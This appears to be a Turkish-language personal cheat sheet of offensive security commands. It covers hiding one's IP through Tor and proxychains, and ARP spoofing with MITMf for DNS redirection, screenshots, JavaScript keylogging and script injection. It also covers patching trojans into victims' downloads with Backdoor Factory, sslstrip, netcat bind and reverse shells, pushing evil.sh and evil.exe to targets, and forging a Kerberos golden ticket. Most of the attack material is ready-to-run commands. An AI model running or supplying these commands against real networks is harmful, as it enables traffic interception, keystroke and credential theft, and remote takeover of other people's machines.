### VPN

1.  Mozilla Firefox tarayıcıda Vpn kullanımı için web tarayıcı adres kısmına “about:config” gir.  
    “media.peerconnection.enable” -> false yap.  (Gerçek ip adresinin vpn kullanımında bazı yerlerde geçmesini engeller.)  
    Vpnbook ‘a gir. Openvpn sekmesinden indirilen vpn dosyasını “unzip” ile çıkar. “openvpn açılacakportadı.ovpn” (Yükleme yaparken tarayıcı pencereleri kapat)
2.  Opera tarayıcı içinde Vpn var.
3.  www.dnsleaktest.com -> Hangi ülke ip’sinde olduğunu görme. Gerçek ip mizi bulunabilir mi test eder.  
     

### TOR Browser

>   
> Kaliye Tor Kurma;  
> “apt-get install tor -y”  
> “apt-get install proxychains”  
> leafpad /etc/proxychains.conf  
>     #dynamic\_chain    //# işaretini sil  
>     #strict\_chain        //# işareti ekle  
>     En alttaki socks4 -> socks5 yap. Kaydet  
> Tarayıcıda : proxy ayarları -> manuel ayarları seç. socks host : 127.0.0.1  port: 9050 gir  
> Tor ağını başlat    =>    “service tor start”  
> \*\*Siteden girilen ip adresi değişti. Komut satırında ise hala eski ip mevcut. Onunda değişmesi için;  
> “proxychains curl icanhazip.com”    => Yazacağın her komutun başına proxychains yaz, ip gizlenir.

MITM (Man in the Middle Framework):  
Yüklemek için     ->    “apt-get install mitmf”  
“mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0”  
Güvenli Https isteklerini Http olarak açtırır. Hsts kullanan sitelerde çalışmaz. (Hsts: Adres satırına elle http girsen bile seni https sayfasına atar. Facebook ve gmail hsts kullanıyor)  
MITM DNS  
Sahte Dns adreslerine yönlendirme yapar.İstediğimiz ip adresine yönlendiririz.  
“leafpad /etc/mitmfmitmf.conf” -> Açılan dosyada \[\[\[A\]\]\] yazan yer girilen sitenin yönlendirildiği ip nin yazıldığı yer. (\*.hotmail.com = 192.168.1.1)  
Yönlendirmeyi başlatma :  
“mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0 --dns”

Ekran Görüntüsü Alma:  
“mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0 --screen --interval 20” (20 saniye)  
Görüntülerin kaydedildiği yer : /var/log/mitmf  
Hata verirse : “pip install Twisted=15.5.0”  
Klavye Tuşlarını Takip Etmek:  
“mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0 --jskeylogger”  
Java Script Kodlarını Çalıştırmak:  
“mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0 --inject --js-payload “alert(‘...’);”

BDF (Backdoor Factory) Proxy:  
Hedef birşey indirmek istediğinde biz trojanımızı o dosyanın içine yamalıyoruz. Bunun için;  
1-    Aynı ağda olmak  
2-    Man in the middle olmak  
3-    BDF Proxy ayarlarını yapmak gerekir.

“leafpad /etc/bdfproxy/ bdfproxy.cfg”  
1-    proxy mode = transparent  
2-    Hedef işletim sistemi neyse ordaki host ip yerine kendi ip mizi yazıyoruz.  
“ip tables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080”  
(80’den gelen bağlantıyı 8080’e yönlendir)  
“bdfproxy” yaz. Saldırıyı başlat.  
MITM saldırısını başlat. Dinleme modu için;  
“msfconsole -r /usr/share/bdfproxy/.... .rc (bdfproxy nin dinlediği dosya yolu)  
SSL Strip Çalıştırma (Https’i Http’ye Çevirme)  
“ip tables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000”

“sslstrip”  
Ettercap çalıştırma:  
“ettercap -Tq -M arp:remote -S -i wlan0 /192.168.1.1//  /192.168.1.15//”  
// -S -> sslstrip kendimiz yaptığımız için S koymalıyız.  
Virüslü Dosyayı Görsel Dosya İle Birleştirme:

  
BIND SHELL , REVERSE SHELL

BIND SHELL  
Hedef üzerinde komut çalıştırılır. Gelen istekleri onaylayacak port açar. Biz hedefteki açılan porta istek göndeririz. Hedef isteği kabul eder.  
Örnek;  
Saldırgan makine    : nc -vvn hedef ip port  
Hedef makine        :nc.exe -lvp port -e cmd.exe  //Önceden dosyanın o pc de olması gerekir  
REVERSE SHELL  
Hedef üzerinde komut çalıştırılır. Hedeften bize bağlantı isteği gelir. Biz dinleme modunda bekleriz ve gelen isteği kabul ederiz.  
Örnek;  
Saldırgan makine    : nc -lvp port  
Hedef makine        :nc.exe -vvn saldırgan\_ip port -e cmd.exe  //Bağlantıdan sonra cmd.exe çalışır.  
\*\*\*Düzgün bir shell almak için;  
python -c ‘import pty;pty.spawn(“/bin/bash”)’

Uzaktan Bağlantı Kurmak (Windows)  
winexe  
winexe --user=Administrator%Parola ||hedef ip “cmd”    //Hedef komut satırına ulaşma  
psexec

NETCAT  
Sistemler arası iletişim kurmayı sağlar.  
Netcat ile TCP port tarama:  
nc -nvv -z 192.168.1.100 1-50  //port aralığını tarar.  
Netcat ile shell alma:  
1\. Dinleme için    =>    nc -lvp 4444  
2\. Komut    =>    nc -e /bin/sh kendi ipmiz 4444  
      
NETSTAT  
Bilgisayarın gelen ve giden bağlantılarını, bu bağlantılara neden olan programları, pid numaralarını veren bir komuttur.  
cmd =>  “netstat -anob”    daha detaylı =>  “netstat -anobf”  
Kapatmak istediğin pid no varsa;  
cmd => “taskkill /F /PID 2715”  
Görev yöneticisinde çalışan programları komut satırında görmek için;  
cmd =>    “tasklist”  yada  “tasklist /fi “PID EQ 2715”   //sadece o pıd numarasında çalışanı getirir  
Hangi portların dinlendiğini görme;  
cmd =>    “netstat -antp”  
a:    all  
t:    tcp bağlantıları getirir  
u:    udp bağlantıları getirir  
p:    pid hangi uygulamayı kullanıyor

STEGANOGRAFI  
steghide  
Resim içine veri saklama, içindeki veriyi okuma yada dışarı çıkarmaya yarar.  
Veri saklamak için;  
steghide --embed -ef (saklanacak veri) -cf (içine gömülecek dosya) -p (parola) -sf (oluşturulacak dosya adı) -e (şifreleme metodu) -z (sıkıştırma derecesi) -v (verbose)  
Kontrol için;  
steghide --info (kontrol edilecek dosya) -p (parola)  
Veriyi açmak için;  
steghide --extract -sf (şifrelenmiş dosya) -p (parola) -xf (oluşturulacak dosya adı)  
Open Stego  
Java destekli ortamlarda çalışır  
Invisible Secret 4  
Puffer 4.04  
Xiao Steganography 2.61  
S-Tools

Damgalama (Watermarking)  
Bir dosyanın telif hakkını sağlayabilmek için o dosyanın içine gömme işlemine watermarking denir.  
binwalk  
Bir dosya içinde gömülü başka dosya olup olmadığını görürüz.

Hedef Sisteme Dosya Atma  
wget  
“wget dosya yolu url adresi”

scp  
“scp dosya yolu  kullanıcı adı@hedef ip:/tmp/”  
Örnek:    scp /var/www/html/evil.sh  msfadmin@192.168.1.10:/tmp/

netcat  
Hedefte netcat yüklüyse;  
“nc -lvp 4444 >evil.sh.2”    => Hedefte dinlemeye aldık. Gelen dosyayı evil.sh.2 olarak kaydet.  
kendi pc mizde;  
“nc 192.168.1.12 4444 \<evil.sh

powershell  
1.    Apache servisi çalışıyor olacak  
2.    İlgili dosya apache dizininde olacak  
“powershell.exe (New-Object System.Net.WebClient).Download.File(‘http://ip\_adresi/evil.exe’,’C:\\Users\\Default\\evil.exe’)”

Load Balance Detector  
Kali üzerinde “lbd” aracı ile hedefte yük dengeleyici olup olmadığını tespit ederiz. Özellikle Ddos saldırılarındaki yükü dengelemek için kullanılan bir güvenlik sistemidir.  
“lbd site adı”

Mobil (Android) Güvenliği

Kullanılan araçlar = apktool , jadx (apk yada ipa uzantılı dosyaların içeriğindeki kodları okumaya yarar.  
AndrodBugs = otomatik analizler gerçekleştirir, uygulamanın kullandığı güvenlik önlemlerini gösterir.  
Sanal Android Uygulama = Android studio , Genymotion, Android x86 ( Fiziksel cihaz yerine sanal android oluşturma)  
Taşınabilir Android Pentest Aracı = Appie (Windows)  
Yapman gereken işlemler

1    Apk kurmadan önce nelere karşı önlem alınmış onları bilmek gerekir.  
2    Normal kullanıcı gibi apk yı yükle ve nasıl çalıştığını anlamak için kurcala.  
3    Uygulamanın yaptığı işlemleri izlemek için wireshake ve burp aracı ile network ve veri trafiği izlenebilir.  
4    Depolama alanları ve uygulama loglarının incelenmesi

  
FTP   
Wireshark ile FTP üzerinden aktarılan verinin dışarıya kayıt edilebilmesi için,  
•    ftp-data filtresinden faydalanabilirsiniz.  
•    RAW olarak kayıt etmeniz gerekmektedir.  
Adb Shell ile telefona bağlantı yapılabilir.

  
Veritabanı  
Sqlite  
Veritabanı dosyasına bağlanma =  Sqlite3 database\_adı  
Tablo bilgilerini görme        = PRAGMA table\_info(tablo adı)  
Verileri getirme            = SELECT \* FROM tablo adı

GOLDEN TICKET  
Kerberos golden ticket oluşturma  
run post/Windows/escalate/golden\_ticket   
“golden\_ticket\_create -h”  
\-d = domain tam adı  
\-g = grup yetki numaraları  
\-i = grup kullanıcı id si  
\-k = ntlm hashi kerberos  
\-s = domain sid değeri  
\-u = kullanıcı adı  
\-t = nereye kaydedileceği  
Sid bulma = wmic useraccount get name, sid  
Kerberos\_ticket\_use    / ticket yolu  
Kerberos\_ticket\_list
